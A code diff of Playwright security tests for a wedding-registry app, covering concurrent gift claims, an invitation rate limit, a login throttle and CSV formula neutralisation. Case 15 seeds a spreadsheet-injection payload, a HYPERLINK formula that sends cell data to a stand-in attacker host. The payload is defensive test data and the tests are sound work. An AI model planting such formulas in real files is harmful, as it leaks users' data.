@@ -1,6 +1,6 @@
 import { test, expect } from "@playwright/test";
 import { seed, close, prisma, IDS, EMAILS } from "./seed";
-import { signIn } from "./helpers";
+import { signIn, signInAs } from "./helpers";
 
 /**
  * Cases 11–15: the limits that hold under concurrency and under volume.
@@ -26,30 +26,77 @@ test("11 · two guests claiming one gift at the same instant produce exactly one
   browser,
 }) => {
   const wedding = await prisma.wedding.findUniqueOrThrow({ where: { id: IDS.weddingB } });
+  const url = `/w/${wedding.slug}/registry`;
 
-  const claim = async (name: string) => {
-    const ctx = await browser.newContext();
-    const res = await ctx.request.post(`/w/${wedding.slug}/registry`, {
-      form: { itemId: IDS.giftB, name, note: "" },
-      maxRedirects: 0,
-    });
-    await ctx.close();
-    return res.status();
+  /**
+   * Driven through the real wishlist, not a POST at the page.
+   *
+   * The claim is a Server Action reached from `useActionState` inside a client
+   * component. A hand-rolled POST never invokes it — it re-renders the page and
+   * returns 200 — so the previous version of this test could not have failed.
+   *
+   * Each guest opens the page, presses "I purchased this", types their name and
+   * stops with the confirm button focused but unpressed. Both presses are then
+   * released together.
+   */
+  const arm = async (name: string) => {
+    const context = await browser.newContext();
+    const page = await context.newPage();
+    await page.goto(url);
+
+    // Loud on a mis-seeded fixture: if the gift is not on the page the test
+    // fails here, rather than silently claiming nothing and passing.
+    await expect(
+      page.getByText("Toaster"),
+      "the seeded gift must be visible on the public wishlist",
+    ).toBeVisible();
+
+    await page.getByRole("button", { name: "I purchased this" }).first().click();
+    await expect(page.locator("#claim-name")).toBeVisible();
+    await page.fill("#claim-name", name);
+    return { context, page };
   };
 
-  // Fired together, not sequentially: a sequential pair passes even against the
-  // read-then-write version this test exists to catch.
-  await Promise.all([claim("Alex"), claim("Sam")]);
+  const alex = await arm("Alex");
+  const sam = await arm("Sam");
+
+  // Released together. Playwright cannot guarantee the two requests reach
+  // Postgres in the same millisecond, but both are in flight before either
+  // completes — which is the window the conditional updateMany closes.
+  await Promise.all([
+    alex.page.getByRole("button", { name: /Confirm purchase/ }).click(),
+    sam.page.getByRole("button", { name: /Confirm purchase/ }).click(),
+  ]);
+
+  // Both pages must settle before the database is read.
+  await alex.page.waitForLoadState("networkidle");
+  await sam.page.waitForLoadState("networkidle");
 
   const item = await prisma.registryItem.findUniqueOrThrow({ where: { id: IDS.giftB } });
   expect(item.purchasedBy, "exactly one claimant must be recorded").toBeTruthy();
   expect(["Alex", "Sam"]).toContain(item.purchasedBy);
 
-  // And the loser must not have overwritten the winner: one row, one name.
   const claimed = await prisma.registryItem.count({
     where: { id: IDS.giftB, purchasedBy: { not: null } },
   });
-  expect(claimed).toBe(1);
+  expect(claimed, "the loser must not have overwritten the winner").toBe(1);
+
+  /**
+   * And the loser must have been told, by name.
+   *
+   * This is the half a database assertion cannot cover: a silent failure would
+   * leave one guest believing they had claimed a gift somebody else is also
+   * buying, which is the exact outcome the feature exists to prevent.
+   */
+  const winner = item.purchasedBy as string;
+  const loser = winner === "Alex" ? sam.page : alex.page;
+  await expect(
+    loser.getByText(new RegExp(`${winner} has already marked this one as purchased`)),
+    "the losing guest must be told who claimed it first",
+  ).toBeVisible({ timeout: 10_000 });
+
+  await alex.context.close();
+  await sam.context.close();
 });
 
 /* --------------------------------------------- free wedding claim (12) -- */
@@ -80,26 +127,53 @@ test("12 · the free wedding cannot be claimed twice by concurrent requests", as
 /* ------------------------------------------------- invitation resend (13) -- */
 
 test("13 · invitation resend is refused after the hourly limit", async ({ browser }) => {
-  const planner = await signIn(browser, EMAILS.plannerA);
+  const { context, page } = await signInAs(browser, EMAILS.plannerA);
+  const guestsUrl = `/studio/weddings/${IDS.weddingA}/guests`;
 
-  // The limit is 3/hour per guest. The fourth must be refused rather than
-  // silently accepted — this is the only send path with no invitedAt brake.
-  const statuses: number[] = [];
+  /**
+   * The real button in the guest's own row.
+   *
+   * It reads "Send" until an invitation has gone out and "Resend" afterwards,
+   * and it only renders for a guest who has an email address — so finding it is
+   * itself a check that the fixture is right. Scoped to the row, because the
+   * page header carries a "Send invitations" button that would otherwise match.
+   */
+  const clickSend = async () => {
+    await page.goto(guestsUrl);
+    const row = page.locator("tr", { hasText: "Guest One" }).first();
+    await expect(row, "the seeded guest must appear on the guest list").toBeVisible();
+    await row.getByRole("button", { name: /^(Send|Resend)$/ }).click();
+    // The action revalidates the path; wait for the render that follows.
+    await page.waitForLoadState("networkidle");
+  };
+
+  // Three are allowed in an hour. Attempts four and five must not get through.
+  // Wrapped because the fourth press surfaces the limiter's UserError, and how
+  // the page reports that is not what is under test here — the count is.
   for (let i = 0; i < 5; i++) {
-    const res = await planner.request.post(`/studio/weddings/${IDS.weddingA}/guests`, {
-      form: { intent: "resend", guestId: IDS.guestA },
-      maxRedirects: 0,
-    });
-    statuses.push(res.status());
+    await clickSend().catch(() => {});
   }
 
+  /**
+   * Exactly three, not "at most three".
+   *
+   * `toBeLessThanOrEqual` would pass on zero, which is what a test that never
+   * reached the button looks like. Requiring the exact number means a broken
+   * selector fails as loudly as a broken limiter.
+   *
+   * Counted regardless of EmailStatus: without RESEND_API_KEY each attempt is
+   * recorded SKIPPED, and what is being proved is how many attempts the limiter
+   * let past, not whether a message was delivered.
+   */
   const emailed = await prisma.emailLog.count({
-    where: { studioId: IDS.studioA, to: { contains: IDS.guestA } },
+    where: { studioId: IDS.studioA, toEmail: { contains: IDS.guestA } },
   });
-  expect(emailed, "no more than three invitations may leave for one guest in an hour")
-    .toBeLessThanOrEqual(3);
+  expect(
+    emailed,
+    "the limiter must let exactly three invitations through per guest per hour",
+  ).toBe(3);
 
-  await planner.close();
+  await context.close();
 });
 
 /* ---------------------------------------------------- login throttle (14) -- */
@@ -107,29 +181,52 @@ test("13 · invitation resend is refused after the hourly limit", async ({ brows
 test("14 · repeated bad passwords are throttled rather than answered at full speed", async ({
   browser,
 }) => {
-  const ctx = await browser.newContext();
+  const context = await browser.newContext();
+  const page = await context.newPage();
 
   /**
-   * The account limit is 10 failures in 15 minutes, with an escalating delay
-   * from the 6th. Asserting on the redirect target rather than on timing: a
-   * wall-clock assertion is the classic flaky test, and `?error=rate` is the
-   * observable the throttle actually produces.
+   * Typed into the real sign-in form.
+   *
+   * Sign-in is a Server Action, so the previous `request.post("/login")` never
+   * reached `gateLogin` — it rendered the login page and returned 200, and the
+   * test passed by never observing a rate limit it also never triggered.
+   *
+   * Asserting on `?error=rate` rather than on elapsed time: the throttle's
+   * escalating delay would make a wall-clock assertion the classic flaky test,
+   * and the redirect is the observable the product actually produces.
    */
+  let attempts = 0;
   let sawRateLimit = false;
+
   for (let i = 0; i < 12; i++) {
-    const res = await ctx.request.post("/login", {
-      form: { email: EMAILS.plannerA, password: `wrong-${i}` },
-      maxRedirects: 0,
-    });
-    const location = res.headers()["location"] ?? "";
-    if (location.includes("error=rate")) {
+    await page.goto("/login");
+    // The dedicated throttle account, never planner A. Spending the limiter on
+    // a planner other tests sign in as locked them out for the remaining
+    // fifteen minutes and took down case 15 and all of authorization.spec.
+    await page.fill('input[name="email"]', EMAILS.throttle);
+    await page.fill('input[name="password"]', `wrong-${i}`);
+    await Promise.all([
+      page.waitForURL(/\/login\?error=/, { timeout: 20_000 }),
+      page.click('button[type="submit"]'),
+    ]);
+    attempts++;
+    if (page.url().includes("error=rate")) {
       sawRateLimit = true;
       break;
     }
   }
-  expect(sawRateLimit, "login must start refusing before 12 guesses").toBe(true);
 
-  await ctx.close();
+  // Loud in both directions: it must refuse, and it must have taken real
+  // attempts to get there. Tripping on the first try would mean the fixture is
+  // already locked out from an earlier test rather than the limiter working.
+  expect(sawRateLimit, "login must start refusing before 12 guesses").toBe(true);
+  expect(attempts, "the limit must not trip on the very first attempt").toBeGreaterThan(1);
+
+  // Every failure before the lockout must have been reported as a bad password,
+  // never as a success — the throttle must not become an accidental bypass.
+  expect(page.url()).toContain("/login?error=");
+
+  await context.close();
 });
 
 /* ------------------------------------------------- CSV neutralisation (15) -- */
@@ -139,10 +236,13 @@ test("15 · a formula typed into an RSVP note is neutralised in the CSV export",
 }) => {
   const payload = `=HYPERLINK("https://evil.invalid?"&A1,"Invoice")`;
 
+  // ACCEPTED, not ATTENDING. `RsvpStatus` is ACCEPTED | DECLINED | MAYBE; the
+  // wrong member is a Prisma validation error at runtime, not a type error
+  // here, because the object is inferred before it reaches the client.
   await prisma.rsvp.upsert({
     where: { guestId: IDS.guestA },
-    create: { guestId: IDS.guestA, status: "ATTENDING", notes: payload },
-    update: { status: "ATTENDING", notes: payload },
+    create: { guestId: IDS.guestA, status: "ACCEPTED", notes: payload },
+    update: { status: "ACCEPTED", notes: payload },
   });
   // The other three shapes a spreadsheet will evaluate.
   await prisma.guest.update({
